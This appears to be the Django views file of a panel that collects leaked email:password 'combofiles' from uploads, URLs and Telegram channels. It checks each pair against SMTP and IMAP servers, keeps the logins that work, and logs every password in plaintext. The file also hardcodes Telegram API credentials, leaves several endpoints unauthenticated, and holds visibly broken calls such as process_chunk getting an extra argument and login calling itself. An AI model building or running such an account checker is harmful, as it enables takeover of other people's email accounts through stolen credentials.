import asyncio
import io
import json
import logging
import os
import re
import zipfile
from asyncio import gather
from datetime import datetime
import chardet
import aiofiles
import requests
from django.conf import settings
from django.core.files.storage import FileSystemStorage
from django.http import JsonResponse, FileResponse, Http404, HttpResponse
from django.shortcuts import redirect, render
from django.urls import reverse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_GET, require_POST, require_http_methods
from telethon import TelegramClient
from django.contrib.auth import authenticate
from django.contrib.auth.decorators import login_required
from .pooler_logging import logger_temp_smtp
from .utils import extract_country_from_filename, is_valid_telegram_username, SmtpDriver, chunks, ImapDriver

logger = logging.getLogger(__name__)

api_id = '29719825'
api_hash = '7fa19eeed8c2e5d35036fafb9a716f18'


@require_http_methods(['GET', 'POST'])
def login(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect('panel') #redirect to panel
        else:
            return HttpResponse("Invalid credentials", status=401)

    return render(request, "signin.html") #render login page


@require_http_methods(["GET"])
def redirect_to_panel(request):
    return redirect(reverse('panel'))


@login_required(login_url='users:login')
@require_http_methods(["GET", "POST"])
def panel(request):
    return render(request, 'index.html', {'active_page': "dashboard"})


@login_required(login_url='users:login')
@require_http_methods(["GET", "POST"])
def panel_table(request):
    return render(request, 'tables.html', {'active_page': "tables"})


@login_required(login_url='users:login')
@require_http_methods(["GET", "POST"])
def panel_settings(request):
    return render(request, 'settings.html', {'active_page': "settings"})



@csrf_exempt
def upload_file_by_url(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        file_url = data.get('url')

        if not file_url:
            return JsonResponse({'status': 404, 'error': 'No URL provided'}, status=404)

        try:
            response = requests.get(file_url)
            if response.status_code == 200:
                filename = os.path.basename(file_url).replace(" ", "_")
                country = extract_country_from_filename(filename)

                if country:
                    save_path = os.path.join('app', 'data', 'combofiles', country)
                else:
                    save_path = os.path.join('app', 'data', 'combofiles')

                os.makedirs(save_path, exist_ok=True)

                filepath = os.path.join(save_path, filename)
                with open(filepath, 'wb') as file:
                    file.write(response.content)

                return JsonResponse({'status': 200, 'filename': filename})

            else:
                return JsonResponse({'status': 404, 'error': 'File not found'}, status=404)
        except Exception as e:
            return JsonResponse({'status': 500, 'error': str(e)}, status=500)
    else:
        return JsonResponse({'status': 405, 'error': 'Method not allowed'}, status=405)


@csrf_exempt
async def telegram_add_channel(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        channel = data.get('channel')

        if not channel or not is_valid_telegram_username(channel):
            return JsonResponse({'status': 400, 'error': 'Invalid Telegram link or username'}, status=400)

        sanitized_channel = re.sub(r'\W+', '_', channel)

        async def main():
            async with TelegramClient('session_name', api_id, api_hash) as client:
                messages = await parse_messages(client, channel)
                return messages

        new_messages = await main()

        filename = os.path.join('app', 'data', f'parsed_messages_{sanitized_channel}.json')
        os.makedirs(os.path.dirname(filename), exist_ok=True)

        existing_messages = await read_existing_messages(filename)

        existing_texts = {msg['text'] for msg in existing_messages}
        unique_messages = [msg for msg in new_messages if msg['text'] not in existing_texts]

        if unique_messages:
            combined_messages = existing_messages + unique_messages
            await write_messages(filename, combined_messages)
            return JsonResponse({'status': 200, 'messages': unique_messages, 'file': filename})
        else:
            return JsonResponse({'status': 200, 'message': 'No new unique messages to save.'})

    return JsonResponse({'status': 405, 'message': 'Invalid HTTP method'}, status=405)


@require_GET
async def check_emails_view(request, filename):
    try:
        smtp_results, imap_results = await asyncio.gather(
            check_smtp_emails(filename),
            check_imap_emails(filename)
        )
        result = {'smtp_results': smtp_results, 'imap_results': imap_results}
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)


async def process_chunk(chunk, driver, results):
    for cred in chunk:
        if "@" not in cred:
            continue
        if cred.count(":") != 1:
            continue

        email, password = cred.strip().split(":")

        try:
            status = await driver.check_connection(email, password)
            if status['status'] == 'valid':
                results.append(status)

            logger.info({'email': email,
                         'password': password,
                         'valid': status['status'],
                         'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')})

        except Exception as e:
            logger.error(f"Error checking connection for email {email}: {e}")


async def parse_messages(client, channel):
    messages = []
    async for message in client.iter_messages(channel, limit=10):
        messages.append({
            'sender': message.sender_id,
            'date': message.date.strftime('%Y-%m-%d %H:%M:%S'),
            'text': message.text
        })
    return messages


async def read_existing_messages(filename):
    if os.path.exists(filename):
        async with aiofiles.open(filename, 'r', encoding='utf-8') as f:
            content = await f.read()
            return json.loads(content) if content else []
    return []


async def write_messages(filename, messages):
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(json.dumps(messages, ensure_ascii=False, indent=4))


async def check_smtp_emails(filename):
    smtp_driver = SmtpDriver()
    smtp_results = []

    file_path = os.path.join(settings.MEDIA_ROOT, "combofiles", filename)

    if filename.endswith('.zip'):
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            for zip_info in zip_file.infolist():
                if not zip_info.is_dir():
                    with io.TextIOWrapper(zip_file.open(zip_info), encoding='utf-8') as f:
                        lines = f.readlines()
                        chunk_size = 100
                        chunked_lines = list(chunks(lines, chunk_size))
                        tasks = [process_chunk(chunk, smtp_driver, smtp_results, logger_temp_smtp) for chunk in
                                 chunked_lines]
                        await gather(*tasks)
    else:
        async with aiofiles.open(file_path, 'r') as f:
            lines = await f.readlines()
            chunk_size = 100
            chunked_lines = list(chunks(lines, chunk_size))
            tasks = [process_chunk(chunk, smtp_driver, smtp_results, logger_temp_smtp) for chunk in chunked_lines]
            await gather(*tasks)

    return smtp_results


async def read_logs(ind):
    smtp_log_path = os.path.join("app", "data", "temp_logs", 'temp_smtp.log')
    imap_log_path = os.path.join("app", "data", "temp_logs", 'temp_imap.log')

    if not os.path.exists(smtp_log_path):
        async with aiofiles.open(smtp_log_path, 'w') as smtp_file:
            await smtp_file.write('')

    if not os.path.exists(imap_log_path):
        async with aiofiles.open(imap_log_path, 'w') as imap_file:
            await imap_file.write('')

    async with aiofiles.open(smtp_log_path, 'r') as smtp_file, aiofiles.open(imap_log_path, 'r') as imap_file:
        smtp_lines = await smtp_file.readlines()
        imap_lines = await imap_file.readlines()

    smtp_logs = list(map(lambda line: line.strip(), smtp_lines))[ind:ind + 100]
    imap_logs = list(map(lambda line: line.strip(), imap_lines))[ind:ind + 100]

    return JsonResponse({"smtp_logs": smtp_logs, "imap_logs": imap_logs, "n": len(smtp_logs)})


async def get_logs(request, ind):
    logs = await read_logs(ind)
    return logs


async def clear_temp_logs(request):
    smtp_log_path = os.path.join("app", "data", "temp_logs", 'temp_smtp.log')
    imap_log_path = os.path.join("app", "data", "temp_logs", 'temp_imap.log')

    try:
        if os.path.exists(smtp_log_path):
            async with aiofiles.open(smtp_log_path, 'w') as smtp_file:
                await smtp_file.write('')
        if os.path.exists(imap_log_path):
            async with aiofiles.open(imap_log_path, 'w') as imap_file:
                await imap_file.write('')
        return JsonResponse({"message": "Logs cleared successfully"}, status=200)
    except Exception as e:
        return JsonResponse({"message": str(e)}, status=500)


@require_GET
def clear_full_logs(request):
    smtp_log_path = os.path.join(settings.BASE_DIR, "app", "data", "temp_logs", 'smtp.log')
    imap_log_path = os.path.join(settings.BASE_DIR, "app", "data", "temp_logs", 'imap.log')

    try:
        os.remove(smtp_log_path)
        os.remove(imap_log_path)
        return JsonResponse({"message": "Logs cleared successfully"}, status=200)
    except FileNotFoundError:
        return JsonResponse({"message": "Log files not found"}, status=404)
    except Exception as e:
        return JsonResponse({"message": str(e)}, status=500)


async def download_files_from_tg(links):
    async with TelegramClient('session_name', api_id, api_hash) as client:
        files = []
        for link in links:
            message = await client.get_messages(link, limit=1)
            if message and message[0].media:
                file_path = await message[0].download_media()
                files.append(file_path)
        return files


@require_GET
async def get_combofiles_from_tg(request):
    links_file_path = os.path.join(settings.BASE_DIR, "data", "tg.txt")
    try:
        with open(links_file_path, 'r') as file:
            links = [link.strip() for link in file.readlines()]
    except FileNotFoundError:
        raise Http404("Telegram links file not found.")

    files = await download_files_from_tg(links)

    if not files:
        return JsonResponse({"error": "No files found"}, status=404)

    zip_filename = os.path.join(settings.BASE_DIR, "tg.zip")
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

    try:
        response = FileResponse(open(zip_filename, 'rb'), as_attachment=True)
        response['Content-Disposition'] = 'attachment; filename="tg.zip"'
        return response
    finally:
        os.remove(zip_filename)
        for file in files:
            os.remove(file)



def remove_duplicate_lines(file_path):
    try:
        with open(file_path, 'rb') as f:
            raw_data = f.read()
            encoding = chardet.detect(raw_data)['encoding']
            lines = raw_data.decode(encoding).splitlines()

        unique_lines = list(set(lines))

        with open(file_path, 'w', encoding=encoding) as f:
            f.write('\n'.join(unique_lines))

        return len(lines) - len(unique_lines)
    except Exception as e:
        raise e


@require_POST
def upload_combofile(request):
    if 'file' not in request.FILES:
        return JsonResponse({'status': 404, 'error': 'No file part'})

    file = request.FILES['file']
    if not file.name:
        return JsonResponse({'status': 404, 'error': 'No file selected'})

    filename = file.name.replace(" ", "_")
    country = extract_country_from_filename(filename)

    if country:
        save_path = os.path.join(settings.BASE_DIR, 'app', 'data', 'combofiles', country)
    else:
        save_path = os.path.join(settings.BASE_DIR, 'app', 'data', 'combofiles')

    os.makedirs(save_path, exist_ok=True)

    file_path = os.path.join(save_path, filename)
    fs = FileSystemStorage(location=save_path)
    fs.save(filename, file)

    num_duplicates = remove_duplicate_lines(file_path)
    print(f"Removed {num_duplicates} duplicate lines from {filename}")

    return JsonResponse({'status': 200, 'filename': filename})


@require_GET
def download_combofile(request, filename):
    directory = os.path.join(settings.BASE_DIR, 'data', 'combofiles')
    file_path = os.path.join(directory, filename)

    if not os.path.exists(file_path):
        raise Http404(f"File {filename} not found.")

    return FileResponse(open(file_path, 'rb'), as_attachment=True, filename=filename)


@require_GET
def download_logs_file(request):
    directory = os.path.join(settings.BASE_DIR, 'data', 'full_logs')
    files_to_zip = ["smtp.log", "imap.log"]
    zip_filename = os.path.join(settings.BASE_DIR, 'full_logs.zip')

    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files_to_zip:
            file_path = os.path.join(directory, file)
            if os.path.exists(file_path):
                zipf.write(file_path, os.path.basename(file_path))

    try:
        response = FileResponse(open(zip_filename, 'rb'), as_attachment=True)
        response['Content-Disposition'] = f'attachment; filename={os.path.basename(zip_filename)}'
        return response
    finally:
        os.remove(zip_filename)


@require_GET
def check_emails_route(request, filename):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        tasks = [
            asyncio.ensure_future(check_smtp_emails(filename)),
            asyncio.ensure_future(check_imap_emails(filename))
        ]
        results = loop.run_until_complete(asyncio.gather(*tasks))
        smtp_results, imap_results = results
        result = {'smtp_results': smtp_results, 'imap_results': imap_results}
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)
    finally:
        loop.close()


async def download_files_from_tg(links):
    async with TelegramClient('session_name', api_id, api_hash) as client:
        files = []
        for link in links:
            message = await client.get_messages(link, limit=1)
            if message and message[0].media:
                file_path = await message[0].download_media()
                files.append(file_path)
        return files


@require_GET
async def get_from_tg(request):
    links_file_path = os.path.join(settings.BASE_DIR, "data", "tg.txt")

    try:
        with open(links_file_path, 'r') as file:
            links = [link.strip() for link in file.readlines()]
    except FileNotFoundError:
        raise Http404("Telegram links file not found.")

    files = await download_files_from_tg(links)

    if not files:
        return JsonResponse({"error": "No files found"}, status=404)

    zip_filename = os.path.join(settings.BASE_DIR, "tg.zip")
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

    try:
        response = FileResponse(open(zip_filename, 'rb'), as_attachment=True)
        response['Content-Disposition'] = 'attachment; filename="tg.zip"'
        return response
    finally:
        os.remove(zip_filename)
        for file in files:
            os.remove(file)


@require_GET
def download_file(request, filename):
    directory = os.path.join(settings.BASE_DIR, "data", "combofiles")
    file_path = os.path.join(directory, filename)

    if not os.path.exists(file_path):
        raise Http404(f"File {filename} not found.")

    return FileResponse(open(file_path, 'rb'), as_attachment=True, filename=filename)


async def check_imap_emails(filename):
    imap_driver = ImapDriver()
    imap_results = []

    file_path = os.path.join(settings.BASE_DIR, 'app', 'data', 'combofiles', filename)

    if filename.endswith('.zip'):
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            for zip_info in zip_file.infolist():
                if not zip_info.is_dir():
                    with io.TextIOWrapper(zip_file.open(zip_info), encoding='utf-8') as f:
                        lines = f.readlines()
                        chunks_size = 100
                        chunked_lines = list(chunks(lines, chunks_size))
                        tasks = [process_chunk(chunk, imap_driver, imap_results) for chunk in chunked_lines]
                        await asyncio.gather(*tasks)
    else:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
            chunks_size = 100
            chunked_lines = list(chunks(lines, chunks_size))
            tasks = [process_chunk(chunk, imap_driver, imap_results) for chunk in chunked_lines]
            await asyncio.gather(*tasks)

    return imap_results
